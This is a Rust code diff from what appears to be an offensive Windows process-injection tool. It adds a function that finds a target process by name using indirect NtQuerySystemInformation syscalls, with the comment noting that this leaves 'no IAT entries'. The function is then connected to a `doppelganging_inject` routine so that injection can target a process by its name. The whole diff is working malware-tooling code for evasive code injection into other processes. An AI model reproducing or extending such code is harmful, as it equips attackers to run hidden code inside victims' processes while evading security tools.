@@ -594,6 +594,85 @@ unsafe fn map_section_to_process(
 
 // ── Process / thread helpers ─────────────────────────────────────────────────
 
+/// Find a process by image name using `NtQuerySystemInformation`.
+///
+/// Enumerates all running processes and returns the PID of the first match
+/// (case-insensitive). Uses indirect syscalls — no IAT entries.
+///
+/// # Safety
+///
+/// Must be called on Windows x86-64. The SYSTEM_PROCESS_INFORMATION layout
+/// offsets (0x30, 0x38, 0x40) are specific to x64 Windows.
+unsafe fn find_process_by_name(name: &str) -> Result<u32, String> {
+    let mut buf_size: usize = 0;
+
+    // First call to get required buffer size (will return STATUS_INFO_LENGTH_MISMATCH).
+    let _ = syscall!(
+        "NtQuerySystemInformation",
+        5u64,                              // SystemProcessInformation
+        0u64,                              // null buffer
+        0u64,                              // zero size
+        &mut buf_size as *mut _ as u64,    // ReturnLength
+    );
+
+    // Allocate buffer. May need multiple tries as the process list can change
+    // between the size query and the actual enumeration.
+    let mut buffer: Vec<u8> = Vec::new();
+    let mut return_length: usize = 0;
+    for _ in 0..3 {
+        buffer.resize(buf_size + 4096, 0);
+        let status = syscall!(
+            "NtQuerySystemInformation",
+            5u64,                                  // SystemProcessInformation
+            buffer.as_mut_ptr() as u64,            // Buffer
+            buffer.len() as u64,                   // BufferSize
+            &mut return_length as *mut _ as u64,   // ReturnLength
+        );
+        if status.is_ok() && status.as_ref().unwrap() >= &0 {
+            break;
+        }
+        buf_size = return_length;
+    }
+
+    // Walk the SYSTEM_PROCESS_INFORMATION linked list.
+    // Offsets are for x64 Windows:
+    //   0x00: NextEntryOffset (u32)
+    //   0x30: ImageName.Buffer    (*const u16)
+    //   0x38: ImageName.Length    (u16)
+    //   0x40: UniqueProcessId     (u32)
+    let mut offset = 0usize;
+    loop {
+        if offset + 0x48 > buffer.len() {
+            break;
+        }
+        let entry_ptr = buffer[offset..].as_ptr();
+        let next_entry_offset = *(entry_ptr as *const u32) as usize;
+        // UniqueProcessId at offset 0x40
+        let pid = *((entry_ptr as *const u8).add(0x40) as *const u32);
+        // ImageName.Length at offset 0x38 (in bytes, not characters)
+        let name_len = *((entry_ptr as *const u8).add(0x38) as *const u16) as usize;
+        // ImageName.Buffer at offset 0x30
+        let name_ptr = *((entry_ptr as *const u8).add(0x30) as *const *const u16);
+
+        // ImageName.Buffer can be NULL for the System Idle Process (PID 0).
+        if !name_ptr.is_null() && name_len > 0 {
+            let char_count = name_len / 2;
+            let name_slice = std::slice::from_raw_parts(name_ptr, char_count);
+            let proc_name = String::from_utf16_lossy(name_slice);
+            if proc_name.eq_ignore_ascii_case(name) {
+                return Ok(pid);
+            }
+        }
+
+        if next_entry_offset == 0 {
+            break;
+        }
+        offset += next_entry_offset;
+    }
+
+    Err(format!("Process '{}' not found", name))
+}
+
 /// Open an existing process by PID via `NtOpenProcess`.
 unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
     let mut client_id = [0u64; 2];
@@ -882,12 +961,9 @@ pub unsafe fn doppelganging_inject(
                 // For existing processes, we use NtCreateThreadEx (no suspended thread).
                 (h_proc, 0usize, pid, false)
             } else {
-                // Find process by name using NtGetNextProcess or toolhelp32.
-                // For now, attempt to parse as PID and return a clear error.
-                return Err(format!(
-                    "process name lookup not yet implemented; pass PID numerically (got: {})",
-                    ident
-                ));
+                let pid = find_process_by_name(ident)?;
+                let h_proc = open_target_process(pid)?;
+                (h_proc, 0usize, pid, false)
             }
         }
         None => {
